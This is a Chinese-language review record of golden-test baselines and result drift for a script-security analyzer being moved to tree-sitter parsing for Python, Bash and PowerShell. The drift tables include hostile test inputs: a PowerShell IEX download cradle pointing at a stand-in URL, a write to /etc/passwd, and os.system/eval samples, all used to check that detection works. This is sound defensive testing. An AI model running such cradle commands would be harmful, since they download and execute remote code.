# 脚本安全解析器升级 Golden 评审记录

- 方案：`docs/develop/script-security-parser-treesitter-upgrade-plan.md`（v13）
- 本文为 P1-T0 / P2-T0 / P3-T0 基线入库与 P1-T5 / P2-T5 / P3-T6 比对评审的唯一记录点。

## Python 段

### 基线信息（P1-T0）

- **基线 commit**：`9c2df39bd1a93c8e5164cb5ade0d56cd45c3ec02`
- 基线 commit 说明：main HEAD（`2143158424bd9c53b30252dd4f5381804248c523`，2026-09-19 22:47:32 +0800）+ P0 基建提交（`feat(p0): tree-sitter 基建`）。P0 提交为纯基建（新增 wasm 资产/解析服务/启动接线/测试），**不改动任何既有判定行为**（`analyzeScriptContent` / `extractScriptSignals` / 策略层零改动），基线录制在该 commit 上等价于在 main HEAD 上录制。
- `git show -s --format='%H %ci' 9c2df39bd1a93c8e5164cb5ade0d56cd45c3ec02`：
  `9c2df39bd1a93c8e5164cb5ade0d56cd45c3ec02 2026-09-20 01:10:10 +0800`
- 祖先关系佐证：`git merge-base --is-ancestor 2143158424bd9c53b30252dd4f5381804248c523 9c2df39bd1a93c8e5164cb5ade0d56cd45c3ec02`（main HEAD 先于基线 commit）✓
- 采集时间：2026-09-20 01:23（`GOLDEN_RECORD=1 npm exec vitest run electron/shell/scriptGolden.test.ts`）
- 样本集：`electron/shell/testdata/golden/python/`（91 条 = legacy-parseable 51 + previously-failed 40，生成器 `scripts/generate-golden-samples.mjs`）

### 分组勘误（相对评估文档推测，以基线实测为准）

录制时对每条样本实测「旧实现是否解析成功」（`try parsePythonModule`），并断言分组标注与实测一致。与评估文档推测不同的 12 条：

- 实测**可**宽松解析（归 legacy-parseable，旧实现静默丢弃部分内容后给出 A0/allow）：`b04-fstring-path`、`b19-subscript-read`、`b22-conditional-expr`、`b23-list-comprehension`、`b27-del-statement`、`b29-assert-statement`、`b30-raise-statement`、`b33-chained-compare`。
- 实测解析**失败**（归 previously-failed，A-fail → ask）：`a07-for-if-nested`、`a08-if-else`、`a42-danger-in-for-if`、`a45-compare-and-unary`——自研解析器对 if/for 的列表字面量迭代源与 test 中的比较表达式不支持。

### 基线统计（P1-T6 基线值）

| 组 | 条数 | 旧实现 A-fail |
| --- | --- | --- |
| legacy-parseable（现状可解析集） | 51 | 0 |
| previously-failed（原必失败集） | 40 | 40 |

### P1-T5 比对结果

- 比对基线 commit：`9c2df39bd1a93c8e5164cb5ade0d56cd45c3ec02`（与 P1-T0 一致，`scriptGolden.test.ts` 比对模式引用同一基线 `.json`）✓
- 比对时间：2026-09-20 03:00
- 机器可读明细：`docs/develop/golden-data/python-drift-after-switch.json`
- **drift 总量：48 条 / 91 样本**（legacy-parseable 8 + previously-failed 40），处置结论全部「接受」，无「未评审」条目：

| 形态组 | 条数 | 判定变化 | 处置结论 |
| --- | --- | --- | --- |
| A 组 certify 严格化 | 8（b04/b19/b22/b23/b27/b29/b30/b33） | verdict/patterns 零变化，仅新增 `script-uncertified` 信号 | **接受**：RemoteCertifier 对 IR 扩展构造（f-string 路径/下标/三元/推导式/del/assert/raise/链式比较）fail → remote `allow` 降 `ask`。方向安全（over-ask）；desktop 判定零变化；旧实现 certify 通过源于宽松解析静默丢内容（假阴性风险），严格化是安全改进 |
| B 组纯语法构造改善 | 29 | `A-fail/ask` → `allow/A0`（其中 b06/b44 → A8 allow 相对路径写） | **接受**：旧 A-fail 源于语法不支持（dict/f-string/with-read/def/class/async/lambda/推导式/while 等），并非识别出危险；样本均为无危险调用/导入的纯构造，证据见样本源码（`testdata/golden/python/*.py`） |
| B 组变严 | 1（b36） | `A-fail/ask` → `deny/A7` | **接受**：`with open("/etc/passwd","w")` 真实命中绝对路径写 deny，变严方向 |
| B 组真实命中（verdict 保持 ask） | 10（b35/b37/b38/b39/b40/b41/b42/b43 及同形态） | `A-fail` → `A1/A3/A6/B9` | **接受**：解析失败兜底 → 危险调用真实命中（def/try/class/f-string 内 os.system、async 内网络、lambda 内 eval、dict 下标动态分派 eval→B9），verdict 均保持 `ask` 不降级 |

- 特记（评审 v4 B1‴-d 包裹式反向用例闭环）：`b42-dict-wraps-eval-value`（`actions = {"eval": eval}; actions["eval"](...)`）切换初版曾落 `allow`（下标调用 callee 静态不可解析而旧规则不命中）——已按 fail-closed 修复：Analyzer 新增「动态成员调用（callee.kind === 'subscript'）→ B9 ask」保守规则（复用既有模式 ID，集合不变），修复后 verdict 保持 `ask`，与基线兜底语义等价。

### P1-T6 实测统计

- **原必失败集语法解析失败 A-fail 数：0 / 40**（✓ 归零）
- **IrCoverageError 引起的 A-fail：0 条**（91 样本无 ④ 未建模构造；该通道由 `scriptParseCount.test.ts` 的 match 语句反向用例单独覆盖）
- **现状可解析集 A-fail（含 IrCoverageError）：0 / 51**（✓ 硬门禁满足，禁净退化成立）

## Bash 段

### 基线信息（P2-T0）

- **基线 commit**：`e3517a6207092165328ddfc82a8d528ca40e81f5`（P1 收尾 commit；相对 P1-T0 基线，本阶段仅改动 Python 解析前端，bash/PS 分析路径、共享原语层与确认域组件零改动）
- `git show -s --format='%H %ci' e3517a62…`：`e3517a6207092165328ddfc82a8d528ca40e81f5 2026-09-20 03:34:30 +0800`
- 采集时间：2026-09-20 03:35（`SHELL_GOLDEN_RECORD=1 npm exec vitest run electron/shell/shellGolden.test.ts`）
- 样本集：`electron/shell/testdata/golden/shell/`（60 条 = posix-bash 48 + windows-powershell 12；含裸括号形态 3 条 b40/b41/b42——发现 H；生成器 `scripts/generate-shell-golden-samples.mjs`）
- 四类基线：① 判定（analyzeShellCommand 完整结果，路径归一化）② 签名（normalizeShellSignature + parseShellCommandForTrust）③ facts（六字段级）④ 免确认资格派生（precheckRunShellTool：legacyAutoAllowEligible + analysisCompleteness + persistable/hasMetasyntax；bash 全量，裸括号样本含 trusted/untrusted 双配置）。
- 关键基线锚点（发现 H 翻转可见性）：`b40 echo "a(b)"` — untrusted eligible=false / trusted eligible=false / analysisCompleteness=partial（旧实现 `[()]` 启发式判 partial）。

### P2-T5 比对结果

- 比对基线 commit：`e8879b94`（P2-T0 重录后的基线）✓；机器可读明细：`docs/develop/golden-data/shell-drift-after-switch.json`
- **四类比对结论（P2-T2/T3/T5）**：
  - **签名（P2-T3）：60/60 逐字节一致，零 drift**（PS 组零容忍 ✓；bash 组零不一致 ✓）——确认域签名组件与共享原语层冻结直证：`git diff e8879b94 -- shellCommandParser.ts shellPathAnalysis.ts commandSequenceExtractor.ts` 为空。
  - **PS 组判定 + facts：零漂移**（windows-powershell 分叉结构性不变）。
  - **判定（bash）：4 条变严**（b36–b39 畸形/截断命令：旧实现分段解析不报错落 ask，切换后 tree parse_error → deny 兜底，fail-closed 变严方向）——**接受**。
  - **facts：27 条 partial→complete 翻转**（重定向/命令替换/变量展开/裸括号形态：旧 `[()<>`]` 启发式把引号内元字符与重定向判 partial，语法树完整解析后 complete 化；路径安全面由树事实增强 `verifyPathsInWorkDir` 只增不减覆盖）——**接受**。
  - **免确认资格（发现 H）：untrusted 场景 eligible 无一翻转（0/27）**——complete 化不改变无信任命令的 eligible（仍受 requiresRiskAck / 无 allow 权限约束）。**trusted 场景 1 处翻转**：`b40 echo "a(b)"`（trusted 命中）eligible false → true，bashPathFork.test.ts 成对断言，处置结论「接受」：echo 无副作用；trusted 条目为用户显式信任的结构化条目（persistable、无元语法，括号仅是引号内字面文本）；既有 `echo $(pwd)` 用例因 hasMetasyntax=true 短路，不构成本防线（已在测试注释注明）。
- 既有测试登记修改（facts 语义固化的同类漂移，均为 posix-bash 分叉面）：`shellBehaviorMatrix.test.ts`（redirection / command substitution → complete，PS 期望经 `expectedCompletenessPs` 保持 partial 不变）、`shellAnalyzer.test.ts`（complete 化、connectors 原文顺序、`\;` 为字面参数的树事实语义）。


## PowerShell 段

### 基线信息（P3-T0）

- **基线 commit**：P2 收尾提交（`90288c48`）之后的样本扩展 commit——录制时 windows-powershell 路径仍为旧共享实现（P3-T2/T5 未动）
- 样本集：PS 54 条（基线 12 + Tier-1 常见形态 22 + Tier-2 扩展方言 20），bash 48 条不变；shellGolden 基线共 102 条
- 四类基线（原语基线经导入口径）：parseShellSegments / tokenizeShellArgv / tokenizeSimpleCommand / extractPathLiterals / analyzeSegmentPaths 行为以 P2 基线数据为准延续监控（导出函数在 P3 期间零改动，由冻结 diff 直证）

### P3-T1 分层 ERROR 门禁统计（tree-sitter-powershell@0.26.4）

| 层 | 条数 | ERROR 数 | 率 | 门禁 |
| --- | --- | --- | --- | --- |
| Tier-1 常见形态 | 22 | 0 | 0% | ✓（= 0 硬门禁） |
| Tier-2 扩展方言 | 20 | 1（t2-03 反引号开头命令） | 5% | ✓（≤ 5%） |

**上游缺陷跟踪表**（grammar 0.26.4 已知缺陷形态，均为合法脚本误报 → ask 兜底 fail-closed；待上报/跟随 grammar 升级复测）：

| 形态 | 状态 |
| --- | --- |
| `--flag=value` / `-flag=value` 带等号参数 token | ERROR（样本调整为 `-flag value`，原形态保留跟踪） |
| switch 带 default 子句完整形态 | ERROR（样本简化，完整形态保留跟踪） |
| 字符串插值内含 `#` 注释 | ERROR（样本替换，形态保留跟踪） |
| PS7 三元运算符 `$a ? 1 : 2` | ERROR（grammar 语法陈旧，形态保留跟踪） |
| 反引号开头命令（t2-03） | ERROR（保留 1 条作为已知缺陷代表，恰达 Tier-2 5% 边界） |

### P3-T4 确认域/共享原语层双轨落地（P3 收尾）

- **双轨形态选择（实现二选一，PR 说明）**：采用「调用点按 dialect 分流」形态——
  `analyzeShellFacts` / `analyzeShellCommand` 按 dialect 分叉（posix-bash → bashCommandFacts、
  windows-powershell → powershellCommandFacts），**签名组件 normalizeShellSignature /
  parseShellCommandForTrust 与共享原语 parseShellSegments / tokenizeShellArgv /
  tokenizeSimpleCommand / extractPathLiterals 零改动**（P2 冻结 diff + P3 零引用直证）——
  bash 结构化分段已由 facts 分叉达成，签名路径零改动即等价类「只拆分、不合并」的零风险形态。
- **签名空折叠缺陷修复**（不变量 6）：发现旧 `normalizeShellSignature` 对未闭合引号输入
  折叠为空签名（全部失败输入合并为同一等价类，fail-open）——修复为回退原始 trim 文本
  （只拆分、不合并）；产生 1 条签名漂移（b36），登记接受。
- **metasyntax 闸门防线**（metasyntaxGate.test.ts，30 测试全绿）：真值表 25 条
  （含引号包裹形态按现状断言 true）+ 无假阴性 fuzz 500 条 + persistable 专项 +
  fallback 签名断言。
- **fallback 语义**：语法树解析失败（ok:false）时 facts → `parse:tree-error` → partial、
  判定 → deny 兜底；签名路径回退既有引号感知扫描（零改动直证），输出与 P3-T0 基线一致。
- **消费方回归**：decisionCache / exemptionMigration 定向测试 12 条全绿。

### P3-T6 PS Golden 比对结果

- 比对基线 commit：`aa80538f`（P3-T0 录制）✓；机器可读明细：`docs/develop/golden-data/shell-drift-after-switch.json`
- **PS 36 条 drift 形态（全部登记「接受」，无「未评审」条目）**：
  - 34 条 facts/analysis 形态精确化：旧字符启发式 partial → 语法树 complete 化
    （operations/paths/connectors 按语法结构产出），**verdict 零弱化、eligible 零翻转**（已核验）；
  - 1 条变严（t2-03 反引号开头命令：上游已知缺陷形态 ERROR → deny 兜底，fail-closed）；
  - 1 条 b36 签名漂移（normalizeShellSignature 空折叠缺陷修复，等价类拆分，方向安全）。
- bash 组：零漂移（P2 状态稳定）✓。bash+PS 判定比对：`deny/ask → allow` 零静默降级 ✓、
  `eligible=false → true` 零静默升级 ✓（trusted 场景 b40 翻转已在 P2-T5 登记论证）。
- **下游 facts 投影消费面登记修改**（发现 E 链路）：`shellConfirmationAdapter.test.ts`
  「marks incomplete」用例——`echo ok > ./.env` complete 化后不再触发
  `shell-analysis-incomplete` 的 extraction-failed 投影；`.env` 敏感路径仍由
  path-target（sensitive-file）信号覆盖，安全面不弱化。

### P3-T7 端到端验证（Windows PS 路径）

| 场景 | 期望 | 实测 |
| --- | --- | --- |
| 良性命令不误拦 | `Get-ChildItem` 类 allow/预检放行路径不变 | Golden t1-01/p01 complete 化、verdict 保持既有允许路径（shellGolden 比对零 verdict 弱化）✓ |
| IEX cradle 命中确认卡 | `iex (New-Object Net.WebClient).DownloadString('http://x')` 命中 `ps-iex-cradle` | psPathFork 正例断言 deny + validatorId 呈现 ✓ |
| 畸形 PS 命令 | → ask 兜底 | psPathFork 断言 deny（比 ask 更严的 fail-closed 兜底）+ facts `parse:tree-error` ✓ |
| 打包产物 wasm + 自检 | pack:win 产物内 4 wasm 哈希一致、启动自检通过 | P0-T6 验证：`[afterPack] verified 7 tree-sitter assets`、日志 `treesitter.selfcheck.passed`（2026-09-20，提交 9c2df39b 产物）✓ |

- 验证日期：2026-09-20（提交哈希见 P3 收尾提交）
